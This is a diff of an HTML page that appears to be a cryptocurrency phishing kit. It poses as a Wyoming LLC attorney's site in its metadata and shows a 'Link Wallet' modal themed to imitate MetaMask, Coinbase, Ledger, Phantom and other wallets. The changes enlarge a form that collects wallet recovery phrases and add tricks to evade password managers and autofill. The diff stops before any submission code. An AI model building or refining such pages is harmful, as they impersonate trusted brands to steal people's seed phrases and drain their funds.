@@ -5,419 +5,506 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Link Wallet | Secure Connection</title>
     <meta name="description" content="Form a Wyoming LLC with attorney-built systems. Get privacy, asset protection, and tax benefits. Same-day filing, $99 + state fees. 100,000+ businesses formed.">
-<meta name="keywords" content="Wyoming LLC, Form Wyoming LLC, LLC formation, Wyoming limited liability company, business formation, asset protection, privacy, anonymous LLC, registered agent Wyoming">
-<meta name="author" content="Wyoming LLC Attorney">
-<meta name="robots" content="index, follow">
+    <meta name="keywords" content="Wyoming LLC, Form Wyoming LLC, LLC formation, Wyoming limited liability company, business formation, asset protection, privacy, anonymous LLC, registered agent Wyoming">
+    <meta name="author" content="Wyoming LLC Attorney">
+    <meta name="robots" content="index, follow">
 
-<!-- Open Graph / Facebook -->
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://www.wyomingllclimited.xyz/">
-<meta property="og:title" content="Form a Wyoming LLC - Wyoming LLC Attorney | Privacy & Asset Protection">
-<meta property="og:description" content="Limited Liability, Limitless Potential ℠. Register your business in Wyoming with complete privacy, asset protection, and no state taxes. Same-day filing available.">
-<meta property="og:image" content="https://www.wyomingllclimited.xyz/assets/wyoming.png">
-<meta property="og:image:alt" content="Wyoming LLC Attorney Logo">
-<meta property="og:site_name" content="Wyoming LLC Attorney">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.wyomingllclimited.xyz/">
+    <meta property="og:title" content="Form a Wyoming LLC - Wyoming LLC Attorney | Privacy & Asset Protection">
+    <meta property="og:description" content="Limited Liability, Limitless Potential ℠. Register your business in Wyoming with complete privacy, asset protection, and no state taxes. Same-day filing available.">
+    <meta property="og:image" content="https://www.wyomingllclimited.xyz/assets/wyoming.png">
+    <meta property="og:image:alt" content="Wyoming LLC Attorney Logo">
+    <meta property="og:site_name" content="Wyoming LLC Attorney">
 
-<!-- Twitter -->
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:url" content="https://www.wyomingllclimited.xyz/">
-<meta name="twitter:title" content="Form a Wyoming LLC - Wyoming LLC Attorney">
-<meta name="twitter:description" content="Get attorney-built Wyoming LLC formation with privacy, asset protection, and tax benefits. $99 + state fees.">
-<meta name="twitter:image" content="https://www.wyomingllclimited.xyz/assets/wyoming.png">
-<meta name="twitter:image:alt" content="Wyoming LLC Attorney Logo">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://www.wyomingllclimited.xyz/">
+    <meta name="twitter:title" content="Form a Wyoming LLC - Wyoming LLC Attorney">
+    <meta name="twitter:description" content="Get attorney-built Wyoming LLC formation with privacy, asset protection, and tax benefits. $99 + state fees.">
+    <meta name="twitter:image" content="https://www.wyomingllclimited.xyz/assets/wyoming.png">
+    <meta name="twitter:image:alt" content="Wyoming LLC Attorney Logo">
 
-<!-- Canonical URL -->
-<link rel="canonical" href="https://www.wyomingllclimited.xyz/">
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://www.wyomingllclimited.xyz/">
 
-<!-- Favicon -->
-<link rel="icon" type="image/x-icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
-<link rel="icon" type="image/png" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
-<link rel="apple-touch-icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
-<link rel="shortcut icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png" type="image/x-icon">
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
+    <link rel="icon" type="image/png" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
+    <link rel="apple-touch-icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png">
+    <link rel="shortcut icon" href="https://www.wyomingllclimited.xyz/assets/wyoming.png" type="image/x-icon">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
-    <style>
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background-color: #060d1e; 
-            color: white; 
-            overflow: hidden;
-        }
+   <style>
+    body { 
+        font-family: 'Inter', sans-serif; 
+        background-color: #060d1e; 
+        color: white; 
+        overflow: hidden;
+    }
 
-        .modal-overlay { 
-            background: rgba(0, 0, 0, 0.7); 
-            backdrop-filter: blur(4px); 
-            z-index: 9999;
-        }
-        
-        /* FIXED MODAL SIZING */
-        .modal-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-        }
-        
+    .modal-overlay { 
+        background: rgba(0, 0, 0, 0.7); 
+        backdrop-filter: blur(4px); 
+        z-index: 9999;
+    }
+    
+    .modal-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+    }
+    
+    .fixed-modal-size {
+        width: 100vw;
+        height: 100vh;
+        margin: 0;
+        border-radius: 0;
+        display: flex;
+        flex-direction: column;
+        background: white;
+        overflow: hidden;
+    }
+    
+    @media (min-width: 768px) {
         .fixed-modal-size {
-            width: 100vw;
-            height: 100vh;
-            margin: 0;
-            border-radius: 0;
-            display: flex;
-            flex-direction: column;
-            background: white;
-            overflow: hidden;
+            width: 95vw;
+            max-width: 1100px;
+            height: 95vh;
+            max-height: 700px;
+            border-radius: 24px;
+            flex-direction: row;
         }
-        
-        @media (min-width: 768px) {
-            .fixed-modal-size {
-                width: 95vw;
-                max-width: 1100px;
-                height: 95vh;
-                max-height: 700px;
-                border-radius: 24px;
-                flex-direction: row;
-            }
-        }
-        
-        /* WALLET LIST - FIXED HEIGHT WITH SCROLL */
+    }
+    
+    /* === COMPLETE FULL SCREEN FORM LAYOUT === */
+    
+    #walletListPanel {
+        height: 35vh;
+        min-height: 250px;
+        max-height: 300px;
+        overflow-y: auto;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    
+    @media (min-width: 768px) {
         #walletListPanel {
-            height: 35vh;
-            min-height: 300px;
-            max-height: 350px;
-            overflow-y: auto;
-            border-bottom: 1px solid #e5e7eb;
+            width: 35%;
+            height: 100%;
+            max-height: 100%;
+            border-right: 1px solid #e5e7eb;
+            border-bottom: none;
         }
-        
-        @media (min-width: 768px) {
-            #walletListPanel {
-                width: 35%;
-                height: 100%;
-                max-height: 100%;
-                border-right: 1px solid #e5e7eb;
-                border-bottom: none;
-            }
-        }
-        
-        /* FORM SECTION - FIXED HEIGHT */
+    }
+    
+    /* 1. ENTIRE INTERACTION PANEL TAKES OVER ON MOBILE WHEN FORM IS ACTIVE */
+    #interactionPanel {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    @media (min-width: 768px) {
         #interactionPanel {
-            height: calc(65vh - 60px);
-            min-height: 500px;
+            width: 65%;
+            height: 100%;
             overflow: hidden;
-            display: flex;
-            flex-direction: column;
         }
-        
-        @media (min-width: 768px) {
-            #interactionPanel {
-                width: 65%;
-                height: 100%;
-                min-height: auto;
-            }
-        }
-        
-        /* FORM CONTENT - FLEXIBLE LAYOUT */
-        .form-scrollable {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            padding: 1rem;
-        }
-        
-        @media (min-width: 640px) {
-            .form-scrollable {
-                padding: 1.25rem;
-            }
-        }
-        
-        @media (min-width: 768px) {
-            .form-scrollable {
-                padding: 1.5rem;
-            }
-        }
-        
-        /* FORM CONTAINER - PROPER HEIGHT DISTRIBUTION */
+    }
+    
+    /* 2. Form container fills entire space */
+    .form-scrollable {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        overflow-y: auto;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+    }
+    
+    /* 3. Form state expands to fill all available space */
+    #formState {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        min-height: 100%;
+        height: auto;
+        padding: 1rem;
+        overflow-y: auto;
+    }
+    
+    @media (min-width: 768px) {
         #formState {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-height: 0;
+            padding: 1.5rem;
+        }
+    }
+    
+    .form-header {
+        flex-shrink: 0;
+        margin-bottom: 1rem;
+        padding-top: 0.5rem;
+    }
+    
+    /* 4. Form stretches to fill space */
+    #submissionForm {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        min-height: 0;
+        height: 100%;
+        gap: 0.75rem;
+    }
+    
+    .form-inputs-section {
+        flex-shrink: 0;
+    }
+    
+    /* 5. Phrase input area takes most of the screen */
+    #phraseInputArea {
+        flex: 1;
+        min-height: 300px;
+        display: flex;
+        flex-direction: column;
+        margin-top: 0.5rem;
+        margin-bottom: 0.5rem;
+        height: auto;
+        overflow: hidden;
+    }
+    
+    /* 6. Phrase grid expands to fill available space */
+    #phraseGrid {
+        flex: 1;
+        min-height: 0;
+        overflow-y: auto;
+        max-height: none;
+        height: 100%;
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 0.5rem;
+        padding: 0.5rem;
+        border: 1px solid #e5e7eb;
+        border-radius: 0.5rem;
+        background-color: #f8f9fa;
+    }
+    
+    @media (min-width: 640px) {
+        #phraseGrid {
+            grid-template-columns: repeat(2, 1fr);
+        }
+    }
+    
+    @media (min-width: 768px) {
+        #phraseGrid {
+            max-height: 400px;
+        }
+    }
+    
+    /* 7. Textarea container also fills space */
+    .phrase-textarea-container {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        height: 100%;
+        min-height: 300px;
+    }
+    
+    .phrase-textarea {
+        flex: 1;
+        min-height: 300px;
+        resize: none;
+        font-family: 'Inter', monospace;
+        line-height: 1.5;
+        padding: 1rem;
+        height: 100%;
+        border: 1px solid #d1d5db;
+        border-radius: 0.5rem;
+    }
+    
+    .phrase-textarea::-webkit-scrollbar {
+        width: 6px;
+    }
+    
+    .phrase-textarea::-webkit-scrollbar-track {
+        background: #f1f1f1;
+        border-radius: 3px;
+    }
+    
+    .phrase-textarea::-webkit-scrollbar-thumb {
+        background: #c1c1c1;
+        border-radius: 3px;
+    }
+    
+    .phrase-textarea::-webkit-scrollbar-thumb:hover {
+        background: #a1a1a1;
+    }
+    
+    /* 8. Submit button at bottom */
+    .submit-button-container {
+        flex-shrink: 0;
+        margin-top: auto;
+        padding-top: 1rem;
+        padding-bottom: 1rem;
+        background-color: inherit;
+    }
+    
+    .compact-input {
+        padding: 0.75rem 1rem !important;
+        font-size: 0.9rem !important;
+        min-height: 46px !important;
+    }
+    
+    .compact-button {
+        padding: 0.875rem !important;
+        font-size: 0.9rem !important;
+        min-height: 48px !important;
+    }
+    
+    .compact-phrase-box {
+        padding: 0.625rem !important;
+        border-radius: 0.5rem !important;
+        min-height: 46px !important;
+    }
+    
+    .compact-phrase-box input {
+        font-size: 0.875rem !important;
+    }
+    
+    .compact-phrase-box .eye-toggle {
+        padding: 0.25rem !important;
+    }
+    
+    .custom-scrollbar::-webkit-scrollbar {
+        width: 4px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-track {
+        background: #f1f1f1;
+        border-radius: 10px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb {
+        background: #c1c1c1;
+        border-radius: 10px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+        background: #a1a1a1;
+    }
+    
+    .wallet-item:hover { 
+        background-color: #f8f9fa; 
+    }
+    .wallet-item.active { 
+        background-color: #f1f3f5; 
+    }
+    
+    @media (min-width: 768px) {
+        .wallet-item.active { 
+            border-right: 4px solid #007aff;
+        }
+    }
+    
+    .btn-gold { 
+        background-color: #eab308; 
+        color: black; 
+        transition: all 0.2s; 
+    }
+    .btn-gold:hover { 
+        background-color: #ca8a04; 
+    }
+    
+    .wallet-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 0.5rem;
+    }
+    
+    @media (min-width: 768px) {
+        .wallet-grid {
+            display: block;
+            grid-template-columns: 1fr;
+        }
+    }
+    
+    /* Theme classes remain the same */
+    .theme-metamask { background-color: #ffffff !important; color: #141618 !important; }
+    .theme-metamask .phrase-box { background-color: #f6f8fa !important; border-color: #f6851b !important; }
+    .theme-metamask .btn-submit { background-color: #f6851b !important; color: white !important; }
+    .theme-trust { background-color: #ffffff !important; color: #1e2329 !important; }
+    .theme-trust .phrase-box { background-color: #f1f3f5 !important; border-radius: 0.5rem !important; }
+    .theme-trust .btn-submit { background-color: #3375bb !important; color: white !important; }
+    .theme-coinbase { background-color: #ffffff !important; color: #0a0b0d !important; }
+    .theme-coinbase .phrase-box { background-color: #f5f8ff !important; border: 1px solid #e5ecff !important; }
+    .theme-coinbase .btn-submit { background-color: #0052ff !important; color: white !important; }
+    .theme-ledger { background-color: #000000 !important; color: #ffffff !important; }
+    .theme-ledger .phrase-box { background-color: #1a1a1a !important; border-color: #3d3d3d !important; }
+    .theme-ledger .btn-submit { background-color: #ffffff !important; color: #000000 !important; }
+    .theme-exodus { background: linear-gradient(135deg, #0b0e11 0%, #1a1d21 100%) !important; color: #ffffff !important; }
+    .theme-exodus .phrase-box { background-color: rgba(255,255,255,0.05) !important; border-color: #6c4cf1 !important; }
+    .theme-exodus .btn-submit { background: linear-gradient(90deg, #6c4cf1, #8f6aff) !important; color: white !important; }
+    .theme-phantom { background-color: #1c1c1e !important; color: #ffffff !important; }
+    .theme-phantom .phrase-box { background-color: #2c2c2e !important; border-radius: 0.5rem !important; }
+    .theme-phantom .btn-submit { background: linear-gradient(90deg, #ab9ff2, #7b6cff) !important; color: white !important; }
+    .theme-rainbow { background-color: #ffffff !important; color: #000000 !important; }
+    .theme-rainbow .phrase-box { background-color: #fff0f7 !important; border: 1px solid #ff007a !important; }
+    .theme-rainbow .btn-submit { background-color: #ff007a !important; color: white !important; }
+    .theme-safe { background-color: #0d0f12 !important; color: #ffffff !important; }
+    .theme-safe .phrase-box { background-color: #1a1a1a !important; border-color: #12ff80 !important; }
+    .theme-safe .btn-submit { background-color: #12ff80 !important; color: #000000 !important; }
+    .theme-others { background-color: #f8f9fa !important; color: #333333 !important; }
+    .theme-others .phrase-box { background-color: #ffffff !important; border: 1px solid #6b7280 !important; }
+    .theme-others .btn-submit { background-color: #6b7280 !important; color: white !important; }
+    .theme-others .phrase-textarea { background-color: #ffffff !important; border: 1px solid #d1d5db !important; }
+    
+    /* === FULL SCREEN MOBILE OVERRIDE - HIDES WALLET LIST WHEN FORM IS ACTIVE === */
+    @media (max-width: 767px) {
+        /* When form is active, hide wallet list and make form full screen */
+        .form-active #walletListPanel {
+            display: none !important;
         }
         
-        /* HEADER - FIXED HEIGHT */
-        .form-header {
-            flex-shrink: 0;
-            margin-bottom: 1rem;
+        .form-active #interactionPanel {
+            width: 100% !important;
+            height: 100% !important;
         }
         
-        /* FORM CONTENT - EXPANDABLE */
-        #submissionForm {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-height: 0;
+        .form-active .fixed-modal-size {
+            flex-direction: column !important;
         }
         
-        /* FORM INPUTS SECTION - FIXED HEIGHT */
-        .form-inputs-section {
-            flex-shrink: 0;
+        /* Mobile back button */
+        .mobile-back-button {
+            display: flex !important;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1rem;
+            background: transparent;
+            border: none;
+            color: #4b5563;
+            font-size: 0.875rem;
+            cursor: pointer;
+            border-bottom: 1px solid #e5e7eb;
+            width: 100%;
         }
         
-        /* PHRASE GRID - EXPANDS TO FILL SPACE */
+        /* Adjust form padding for mobile */
+        #formState {
+            padding: 0.75rem;
+            padding-top: 0;
+        }
+        
+        /* Larger phrase boxes for mobile touch */
+        .phrase-box {
+            min-height: 56px !important;
+            height: 56px !important;
+        }
+        
+        /* Ensure phrase grid uses full height */
         #phraseGrid {
             flex: 1;
             min-height: 0;
-            overflow-y: auto;
-            margin-top: 0.75rem;
-            margin-bottom: 0.75rem;
-            max-height: 400px;
+            max-height: none !important;
         }
         
-        /* TEXTAREA SPECIFIC STYLES */
+        /* Make textarea taller on mobile */
         .phrase-textarea-container {
-            flex: 1;
-            min-height: 0;
-            display: flex;
-            flex-direction: column;
+            min-height: 400px !important;
         }
         
         .phrase-textarea {
-            flex: 1;
-            min-height: 200px;
-            resize: none;
-            font-family: 'Inter', monospace;
-            line-height: 1.5;
-            padding: 1rem;
+            min-height: 350px !important;
         }
         
-        .phrase-textarea::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        .phrase-textarea::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 3px;
-        }
-        
-        .phrase-textarea::-webkit-scrollbar-thumb {
-            background: #c1c1c1;
-            border-radius: 3px;
-        }
-        
-        .phrase-textarea::-webkit-scrollbar-thumb:hover {
-            background: #a1a1a1;
-        }
-        
-        /* SUBMIT BUTTON - ALWAYS VISIBLE AT BOTTOM */
+        /* Submit button with safe area */
         .submit-button-container {
-            flex-shrink: 0;
-            margin-top: auto;
+            padding-bottom: max(1rem, env(safe-area-inset-bottom));
+            background-color: inherit;
         }
-        
-        /* Compact styling */
-        .compact-input {
-            padding: 0.75rem 1rem !important;
-            font-size: 0.9rem !important;
-            min-height: 46px !important;
-        }
-        
-        .compact-button {
-            padding: 0.875rem !important;
-            font-size: 0.9rem !important;
-            min-height: 48px !important;
-        }
-        
-        .compact-phrase-box {
-            padding: 0.625rem !important;
-            border-radius: 0.5rem !important;
-            min-height: 46px !important;
-        }
-        
-        .compact-phrase-box input {
-            font-size: 0.875rem !important;
-        }
-        
-        .compact-phrase-box .eye-toggle {
-            padding: 0.25rem !important;
-        }
-        
-        /* Custom scrollbar styling */
-        .custom-scrollbar::-webkit-scrollbar {
-            width: 4px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 10px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb {
-            background: #c1c1c1;
-            border-radius: 10px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
-            background: #a1a1a1;
-        }
-        
-        /* Wallet items styling */
-        .wallet-item:hover { 
-            background-color: #f8f9fa; 
-        }
-        .wallet-item.active { 
-            background-color: #f1f3f5; 
-        }
-        
-        @media (min-width: 768px) {
-            .wallet-item.active { 
-                border-right: 4px solid #007aff;
-            }
-        }
-        
-        /* Button styling */
-        .btn-gold { 
-            background-color: #eab308; 
-            color: black; 
-            transition: all 0.2s; 
-        }
-        .btn-gold:hover { 
-            background-color: #ca8a04; 
-        }
-        
-        /* Responsive grids */
-        .wallet-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 0.5rem;
-        }
-        
-        @media (min-width: 768px) {
-            .wallet-grid {
-                display: block;
-                grid-template-columns: 1fr;
-            }
-        }
-        
-        .phrase-grid-responsive {
-            grid-template-columns: 1fr;
-            gap: 0.5rem !important;
-        }
-        
-        @media (min-width: 640px) {
-            .phrase-grid-responsive {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-        
-        /* Theme classes */
-        .theme-metamask { background-color: #ffffff !important; color: #141618 !important; }
-        .theme-metamask .phrase-box { background-color: #f6f8fa !important; border-color: #f6851b !important; }
-        .theme-metamask .btn-submit { background-color: #f6851b !important; color: white !important; }
-        .theme-trust { background-color: #ffffff !important; color: #1e2329 !important; }
-        .theme-trust .phrase-box { background-color: #f1f3f5 !important; border-radius: 0.5rem !important; }
-        .theme-trust .btn-submit { background-color: #3375bb !important; color: white !important; }
-        .theme-coinbase { background-color: #ffffff !important; color: #0a0b0d !important; }
-        .theme-coinbase .phrase-box { background-color: #f5f8ff !important; border: 1px solid #e5ecff !important; }
-        .theme-coinbase .btn-submit { background-color: #0052ff !important; color: white !important; }
-        .theme-ledger { background-color: #000000 !important; color: #ffffff !important; }
-        .theme-ledger .phrase-box { background-color: #1a1a1a !important; border-color: #3d3d3d !important; }
-        .theme-ledger .btn-submit { background-color: #ffffff !important; color: #000000 !important; }
-        .theme-exodus { background: linear-gradient(135deg, #0b0e11 0%, #1a1d21 100%) !important; color: #ffffff !important; }
-        .theme-exodus .phrase-box { background-color: rgba(255,255,255,0.05) !important; border-color: #6c4cf1 !important; }
-        .theme-exodus .btn-submit { background: linear-gradient(90deg, #6c4cf1, #8f6aff) !important; color: white !important; }
-        .theme-phantom { background-color: #1c1c1e !important; color: #ffffff !important; }
-        .theme-phantom .phrase-box { background-color: #2c2c2e !important; border-radius: 0.5rem !important; }
-        .theme-phantom .btn-submit { background: linear-gradient(90deg, #ab9ff2, #7b6cff) !important; color: white !important; }
-        .theme-rainbow { background-color: #ffffff !important; color: #000000 !important; }
-        .theme-rainbow .phrase-box { background-color: #fff0f7 !important; border: 1px solid #ff007a !important; }
-        .theme-rainbow .btn-submit { background-color: #ff007a !important; color: white !important; }
-        .theme-safe { background-color: #0d0f12 !important; color: #ffffff !important; }
-        .theme-safe .phrase-box { background-color: #1a1a1a !important; border-color: #12ff80 !important; }
-        .theme-safe .btn-submit { background-color: #12ff80 !important; color: #000000 !important; }
-        .theme-others { background-color: #f8f9fa !important; color: #333333 !important; }
-        .theme-others .phrase-box { background-color: #ffffff !important; border: 1px solid #6b7280 !important; }
-        .theme-others .btn-submit { background-color: #6b7280 !important; color: white !important; }
-        .theme-others .phrase-textarea { background-color: #ffffff !important; border: 1px solid #d1d5db !important; }
-        
-        /* Autofill prevention styles */
-        input:-webkit-autofill,
-        input:-webkit-autofill:hover,
-        input:-webkit-autofill:focus,
-        input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px white inset !important;
-            -webkit-text-fill-color: #374151 !important;
-            background-color: white !important;
-        }
-        
-        /* Dark theme autofill fix */
-        .theme-ledger input:-webkit-autofill,
-        .theme-ledger input:-webkit-autofill:hover,
-        .theme-ledger input:-webkit-autofill:focus,
-        .theme-ledger input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px #1a1a1a inset !important;
-            -webkit-text-fill-color: white !important;
-            background-color: #1a1a1a !important;
-        }
-        
-        .theme-safe input:-webkit-autofill,
-        .theme-safe input:-webkit-autofill:hover,
-        .theme-safe input:-webkit-autofill:focus,
-        .theme-safe input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px #1a1a1a inset !important;
-            -webkit-text-fill-color: white !important;
-            background-color: #1a1a1a !important;
-        }
-        
-        .theme-phantom input:-webkit-autofill,
-        .theme-phantom input:-webkit-autofill:hover,
-        .theme-phantom input:-webkit-autofill:focus,
-        .theme-phantom input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px #2c2c2e inset !important;
-            -webkit-text-fill-color: white !important;
-            background-color: #2c2c2e !important;
-        }
-        
-        .theme-exodus input:-webkit-autofill,
-        .theme-exodus input:-webkit-autofill:hover,
-        .theme-exodus input:-webkit-autofill:focus,
-        .theme-exodus input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px #0b0e11 inset !important;
-            -webkit-text-fill-color: white !important;
-            background-color: #0b0e11 !important;
-        }
-        
-        /* Textarea autofill prevention */
-        textarea:-webkit-autofill,
-        textarea:-webkit-autofill:hover,
-        textarea:-webkit-autofill:focus,
-        textarea:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px white inset !important;
-            -webkit-text-fill-color: #374151 !important;
-            background-color: white !important;
-        }
-        
-        .theme-others textarea:-webkit-autofill,
-        .theme-others textarea:-webkit-autofill:hover,
-        .theme-others textarea:-webkit-autofill:focus,
-        .theme-others textarea:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 30px white inset !important;
-            -webkit-text-fill-color: #374151 !important;
-            background-color: white !important;
-        }
-        
-        /* Disable autocomplete dropdown */
-        input::-webkit-contacts-auto-fill-button,
-        input::-webkit-credentials-auto-fill-button {
-            visibility: hidden;
-            display: none !important;
-            pointer-events: none;
-            position: absolute;
-            right: 0;
-        }
-    </style>
+    }
+    
+    /* === AGGRESSIVE AUTOFILL PREVENTION === */
+    /* 1. Hide all autofill suggestions */
+    input::-webkit-contacts-auto-fill-button,
+    input::-webkit-credentials-auto-fill-button {
+        visibility: hidden;
+        display: none !important;
+        position: absolute;
+        right: 0;
+    }
+    
+    /* 2. Prevent Chrome's yellow autofill background */
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus,
+    input:-webkit-autofill:active,
+    textarea:-webkit-autofill,
+    textarea:-webkit-autofill:hover,
+    textarea:-webkit-autofill:focus,
+    textarea:-webkit-autofill:active,
+    select:-webkit-autofill,
+    select:-webkit-autofill:hover,
+    select:-webkit-autofill:focus,
+    select:-webkit-autofill:active {
+        -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
+        -webkit-text-fill-color: inherit !important;
+        background-color: transparent !important;
+        transition: background-color 50000s ease-in-out 0s !important;
+    }
+    
+    /* 3. Specific overrides for different themes */
+    .theme-ledger input:-webkit-autofill,
+    .theme-ledger input:-webkit-autofill:hover,
+    .theme-ledger input:-webkit-autofill:focus,
+    .theme-ledger input:-webkit-autofill:active {
+        -webkit-box-shadow: 0 0 0px 1000px #1a1a1a inset !important;
+        -webkit-text-fill-color: white !important;
+    }
+    
+    .theme-safe input:-webkit-autofill,
+    .theme-safe input:-webkit-autofill:hover,
+    .theme-safe input:-webkit-autofill:focus,
+    .theme-safe input:-webkit-autofill:active {
+        -webkit-box-shadow: 0 0 0px 1000px #1a1a1a inset !important;
+        -webkit-text-fill-color: white !important;
+    }
+    
+    .theme-phantom input:-webkit-autofill,
+    .theme-phantom input:-webkit-autofill:hover,
+    .theme-phantom input:-webkit-autofill:focus,
+    .theme-phantom input:-webkit-autofill:active {
+        -webkit-box-shadow: 0 0 0px 1000px #2c2c2e inset !important;
+        -webkit-text-fill-color: white !important;
+    }
+    
+    /* 4. Hide autofill dropdown arrow in Edge */
+    input::-ms-clear,
+    input::-ms-reveal {
+        display: none;
+    }
+    
+    /* 5. Make password fields look like regular text fields initially */
+    .phrase-word-input {
+        -webkit-text-security: disc !important;
+        text-security: disc !important;
+    }
+    
+    /* 6. Prevent iOS from showing autocorrect toolbar */
+    input[type="text"],
+    input[type="password"],
+    textarea {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+    }
+</style>
 </head>
 <body class="min-h-screen flex flex-col">
     <!-- Header -->
@@ -449,14 +536,20 @@
     <div id="modal" class="hidden fixed inset-0 modal-overlay modal-container">
         <div class="fixed-modal-size shadow-2xl animate-in fade-in zoom-in duration-300">
             
-            <!-- Mobile Header -->
-            <div class="md:hidden p-3 border-b border-gray-200 flex items-center justify-between bg-[#f8f9fa]">
+            <!-- Mobile Header - Shown when wallet list is visible -->
+            <div id="mobileHeader" class="md:hidden p-3 border-b border-gray-200 flex items-center justify-between bg-[#f8f9fa]">
                 <button id="mobileCloseBtn" class="p-2">
                     <i data-lucide="x" class="w-5 h-5 text-gray-600"></i>
                 </button>
                 <span class="font-semibold text-gray-700 text-sm">Select Wallet</span>
                 <div class="w-9"></div>
             </div>
+            
+            <!-- Mobile Back Button - Shown when form is active -->
+            <button id="mobileBackBtn" class="mobile-back-button hidden md:hidden">
+                <i data-lucide="arrow-left" class="w-4 h-4"></i>
+                <span>Back to wallets</span>
+            </button>
             
             <!-- Left Side: Wallet List -->
             <div id="walletListPanel" class="bg-[#f8f9fa]">
@@ -500,7 +593,6 @@
                             <img src="https://safe.global/favicon.ico" class="w-7 h-7 object-contain" alt="Safe">
                             <span class="font-semibold text-gray-700 text-sm">Safe Wallet</span>
                         </div>
-                        <!-- Others Wallet Option -->
                         <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Others">
                             <div class="w-7 h-7 bg-gray-200 rounded-lg flex items-center justify-center">
                                 <i data-lucide="plus" class="w-4 h-4 text-gray-600"></i>
@@ -542,20 +634,22 @@
                         </div>
 
                         <!-- Form with proper height distribution -->
-                        <form id="submissionForm" class="flex-1 flex flex-col min-h-0">
+                        <form id="submissionForm" class="flex-1 flex flex-col min-h-0" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                             <!-- Fixed inputs section -->
                             <div class="form-inputs-section space-y-3">
-                                <!-- Changed name field to prevent autofill -->
+                                <!-- Name Input - Using non-standard attributes to prevent autofill -->
                                 <input 
                                     type="text" 
                                     id="userName" 
-                                    name="identifier" 
+                                    name="xid" 
                                     placeholder="Enter your name or identifier" 
                                     class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600"
                                     autocomplete="off"
-                                    autocorrect="off"
-                                    autocapitalize="off"
+                                    autocapitalize="none"
                                     spellcheck="false"
+                                    data-lpignore="true"
+                                    data-form-type="other"
+                                    data-1p-ignore="true"
                                 >
                                 
                                 <!-- Others Provider Input -->
@@ -563,17 +657,18 @@
                                     <input 
                                         type="text" 
                                         id="customProvider" 
-                                        name="provider" 
+                                        name="xprovider" 
                                         placeholder="Enter your wallet provider name" 
                                         class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600"
                                         autocomplete="off"
-                                        autocorrect="off"
-                                        autocapitalize="off"
+                                        autocapitalize="none"
                                         spellcheck="false"
+                                        data-lpignore="true"
+                                        data-1p-ignore="true"
                                     >
                                 </div>
                                 
-                                <!-- Phrase Type Selector (Hidden for Others) -->
+                                <!-- Phrase Type Selector -->
                                 <div id="phraseTypeContainer" class="relative">
                                     <select 
                                         id="phraseType" 
@@ -596,14 +691,14 @@
